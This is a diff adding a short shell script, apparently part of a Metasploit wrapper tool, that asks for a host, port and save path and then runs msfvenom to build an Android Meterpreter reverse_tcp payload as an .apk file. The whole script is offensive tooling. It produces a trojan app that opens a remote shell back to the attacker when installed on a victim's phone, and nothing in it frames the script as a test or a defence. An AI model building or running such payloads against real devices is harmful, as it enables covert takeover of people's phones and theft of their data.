@@ -1,0 +1,13 @@
+clear
+cd $metapath
+echo "Enter HOST"
+read -p ">|" host1
+echo "Enter PORT"
+read -p ">|" port1
+echo "Please enter the complete path with .apk extension"
+echo "where you want to save the payload to"
+read -p ">|" p2
+./msfvenom -p android/meterpreter/reverse_tcp LHOST=$host1 LPORT=$port1 R > $p2
+cd ..
+sleep 3
+tload
